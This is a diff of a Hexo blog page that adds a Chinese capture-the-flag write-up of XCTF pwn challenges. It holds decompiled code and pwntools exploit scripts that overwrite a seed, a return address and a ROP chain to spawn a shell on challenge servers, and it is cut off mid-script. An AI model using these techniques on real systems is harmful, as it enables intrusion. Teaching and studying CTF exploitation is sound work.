@@ -216,7 +216,7 @@
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Beranda</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Startseite</a>
 
   </li>
         
@@ -233,7 +233,7 @@
 
     
 
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>Tentang</a>
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>Über</a>
 
   </li>
         
@@ -267,7 +267,7 @@
 
     
 
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>Kategori</a>
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>Kategorien</a>
 
   </li>
         
@@ -284,7 +284,7 @@
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Arsip</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archiv</a>
 
   </li>
         
@@ -353,6 +353,202 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/08/25/攻防世界-进阶/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh"/>
+      <meta itemprop="description" content=""/>
+      <meta itemprop="image" content="/images/avatar.gif"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/08/25/攻防世界-进阶/" class="post-title-link" itemprop="url">攻防世界-进阶</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-08-25 15:18:06" itemprop="dateCreated datePublished" datetime="2019-08-25T15:18:06+08:00">2019-08-25</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2019-10-15 20:16:24" itemprop="dateModified" datetime="2019-10-15T20:16:24+08:00">2019-10-15</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><p><img src="/2019/08/25/攻防世界-进阶/dice-0.GIF" alt="checksec"><br>这题也是猜数，看起来就和前面的guess number那题一样。<br><img src="/2019/08/25/攻防世界-进阶/dice-1.GIF" alt="checksec"><br>只要进入<code>sub_B28((__int64)buf);</code>   这个函数就行了，这个函数悠flag</p>
+<p><img src="/2019/08/25/攻防世界-进阶/dice-2.GIF" alt="checksec"><br>从这里可以知道如何覆盖seed：用buf，他们相差40h</p>
+<p><img src="/2019/08/25/攻防世界-进阶/dice-3.GIF" alt="checksec"><br>这里是具体的猜数字部分，写exp时按着写就可以</p>
+<p>参考之前guessnumber那题写exp</p>
+<p>啊哈，果然是如出一辙，一样的exp搞定<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>, <span class="number">44300</span>)</span><br><span class="line"><span class="comment">#io = process('./dice_game')</span></span><br><span class="line"> </span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line"><span class="comment">##在这个库里可以找到rand</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">"A"</span>*<span class="number">0x40</span>+ p64(<span class="number">1</span>) <span class="comment">#从v7把seed[0]覆盖成1</span></span><br><span class="line">io.sendlineafter(<span class="string">"name: "</span>,pay)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    num = str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me the point(1~6): "</span>,num)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>没有附件，有点头疼。。。<br>从网上直接找吧<br>先补充一下：</p>
+<h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><p><a href="https://www.runoob.com/cprogramming/c-function-sprintf.html" target="_blank" rel="noopener">sprintf</a>:<br>C 库函数 int sprintf(char <em>str, const char </em>format, …) 发送格式化输出到 str 所指向的字符串。<br>就是将格式化字符串输出的值写入到第一个参数中。和print相比，print是将输出给到标准输出流（屏幕），而它是将输出给到它的第一个参数。</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>来自:<a href="https://blog.csdn.net/levones/article/details/88233101[https://blog.csdn.net/levones/article/details/88233101]" target="_blank" rel="noopener">https://blog.csdn.net/levones/article/details/88233101[https://blog.csdn.net/levones/article/details/88233101]</a><br><img src="/2019/08/25/攻防世界-进阶/warmup-1.GIF" alt="checksec"><br>这个程序没有开启任何的保护，而且文件是动态链接却没有给出libc<br><img src="/2019/08/25/攻防世界-进阶/warmup-2.GIF" alt="checksec"><br>可以看到fprint是将<code>sub_40060D</code>这个函数的地址给了s。而且这个<code>sub_40060D</code>里面就是flag，执行这个函数就有flag。<br>最后还有一个gets函数，熟悉的gets()函数，通常一看到这个函数就八成有缓冲区溢出漏洞，可以看出程序为v5开辟了40H的存储空间，所以输入长度超过40H即可造成溢出。即溢出点可以通过计算得出：40H+8H=48H=72</p>
+<h2 id="那么只要溢出让他执行sub-40060D-这个函数就可以了嘛"><a href="#那么只要溢出让他执行sub-40060D-这个函数就可以了嘛" class="headerlink" title="那么只要溢出让他执行sub_40060D 这个函数就可以了嘛"></a>那么只要溢出让他执行sub_40060D 这个函数就可以了嘛</h2><h1 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h1><p><a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">官方题解</a><br><a href="https://www.jianshu.com/p/7c21d3520f99" target="_blank" rel="noopener">简书</a><br><a href="https://blog.csdn.net/qq_41071646/article/details/86600053" target="_blank" rel="noopener">csdn</a><br>简述下解题思路：<br><img src="/2019/08/25/攻防世界-进阶/stack2-1.GIF" alt=""></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);                   <span class="comment">// v6=1  show</span></span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);          <span class="comment">// v6=3  chang</span></span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;                             <span class="comment">// /下标越界</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;                                    <span class="comment">// v6=5  exit</span></span><br><span class="line">    v9 = <span class="number">0</span>;                                     <span class="comment">// V6=4 avg</span></span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目长这样的<br>整体实现的功能就是<br><code>1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit</code><br>这句话<br><img src="/2019/08/25/攻防世界-进阶/stack2-2.GIF" alt=""><br>查找题目中存在的漏洞，存在数组下标溢出：没有对输入的下标进行检查，导致我们可以在栈的任意位置进行写的操作。利用这个我们可以覆盖到这个函数的ret从而控制控制程序。找到ret我们就可以按照常规思路去让他执行system函数了。<br>程序中有一个后门函数hackhere但大佬说出题人在搭建docker环境时未注意，环境中只给了sh。也就是我们只能执行system（sh）来获得权限。<br>system函数从IDA的函数库上可以找到，sh也能从/bin/sh 截取下来。<br>然后就是ret地址在哪的问题了，看IDA  <code>char v13[100]; // [esp+38h] [ebp-70h]</code>以为是0x70+4=116，但是实际上不行。正确的地址是0x84（132）只能自己去调试了<br>那只能这么理解了<br><img src="/2019/08/25/攻防世界-进阶/stack2-3.GIF" alt=""></p>
+<p>exp<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g_local=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh = process(<span class="string">'./stack2'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"111.198.29.45"</span>, <span class="number">48837</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_byte</span><span class="params">(off, val)</span>:</span></span><br><span class="line">    sh.send(<span class="string">"3\n"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">    sh.send(str(off) + <span class="string">"\n"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">    sh.send(str(val) + <span class="string">"\n"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_dword</span><span class="params">(off, val)</span>:</span>   </span><br><span class="line"><span class="comment">#off就是数组下标，而数组的溢出点在0x84（V13[0x84]处是返回地址，因为他不检查数组溢出，这个下标的位置就算rep）</span></span><br><span class="line"><span class="comment">## 这个函数其实实现的就是将val的地址逆序输入到V13[off]的地址处（小断序）</span></span><br><span class="line">    write_byte(off, val &amp; <span class="number">0xff</span>)</span><br><span class="line">    write_byte(off + <span class="number">1</span>, (val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    write_byte(off + <span class="number">2</span>, (val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    write_byte(off + <span class="number">3</span>, (val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 通过4个write_byte 函数 实现了通过利用数组赋值完成将返回地址覆盖成sys地址的目的</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    sh.send(<span class="string">"5\n"</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line">write_dword(<span class="number">0x84</span>, <span class="number">0x8048450</span>)<span class="comment">##数组V13[0x84]处</span></span><br><span class="line">write_dword(<span class="number">0x8C</span>, <span class="number">0x8048980</span> + <span class="number">7</span>)</span><br><span class="line"><span class="comment">##0x8c指向system函数的参数：0x84+4+4（其中ret返回地址4个字节，即0x84-0x87，0x88-0x8B是system函数的返回地址，占4个字节）</span></span><br><span class="line"><span class="comment">##0X8048980是字符串/bin/sh的地址。+7是因为我们只要其中的sh这两个字符</span></span><br><span class="line">exit()  <span class="comment">##exit结束main函数，然后就会跳到它的返回地址执行system函数，而且system函数的参数也被我们布置成sh。运行后我们就可以得到权限</span></span><br></pre></td></tr></table></figure></p>
+<p>看了好久才看懂它自己定义的两个函数，就是完成一个小端序下输入system函数的地址，和sh的地址这两件事</p>
+<p>一样的代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">system_addr=<span class="number">0x080485AF</span></span><br><span class="line">leave_offset=<span class="number">0x84</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span><span class="params">(addr,va)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">    io.sendline(str(addr))</span><br><span class="line">    io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">    io.sendline(str(va))</span><br><span class="line">    io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># write  system_addr  0x08048450</span></span><br><span class="line"> </span><br><span class="line">write_addr(leave_offset,<span class="number">0X50</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X84</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"><span class="comment"># sh_addr  0x08048987</span></span><br><span class="line">leave_offset+=<span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> leave_offset</span><br><span class="line">write_addr(leave_offset,<span class="number">0x87</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X89</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"> </span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"> ———————————————— </span><br><span class="line">版权声明：本文为CSDN博主「NYIST皮皮虾」的原创文章，遵循CC <span class="number">4.0</span> by-sa版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/qq_41071646/article/details/<span class="number">86600053</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/08/25/攻防世界-进阶/stack2-4.GIF" alt=""></p>
+<p>链接:<br><a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a></p>
+<p><a href="https://blog.csdn.net/qq_41071646/article/details/86600053" target="_blank" rel="noopener">https://blog.csdn.net/qq_41071646/article/details/86600053</a></p>
+<h1 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h1><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42530&amp;ctid=157" target="_blank" rel="noopener">i春秋的帖子</a><br>这个很重要！！！！</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p><strong>无libc，无system，无”/bin/sh”，有read，puts函数</strong></p>
+<p>1.利用DynELF模块泄露system函数地址<br>2.构造rop链，写入”/bin/sh”<br>3.调用system函数</p>
+<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>/bin/sh可写的空间<br><img src="/2019/08/25/攻防世界-进阶/pwn100-bin.GIF" alt=""><br>pop_rdi<br><img src="/2019/08/25/攻防世界-进阶/pwn100-pop.GIF" alt=""><br>把binsh写入哪里呢？<br><strong>查找可以写入/bin/sh的地址</strong><br><code>gdb-peda$ vmmap</code></p>
+<p>找到可写的地址=。=<br>利用DynELF存在一个问题，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含/x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点</p>
+<p>##exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">46875</span>)</span><br><span class="line"><span class="comment">#io = process("./pwn-100")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn-100"</span>)</span><br><span class="line"></span><br><span class="line">rop1 = <span class="number">0x40075A</span> <span class="comment">#pop rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">rop2 = <span class="number">0x400740</span> <span class="comment">#rdx(r13), rsi(r14), edi(r15d)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400763</span></span><br><span class="line"><span class="comment"># start_addr = elf.symbols['_start']</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span 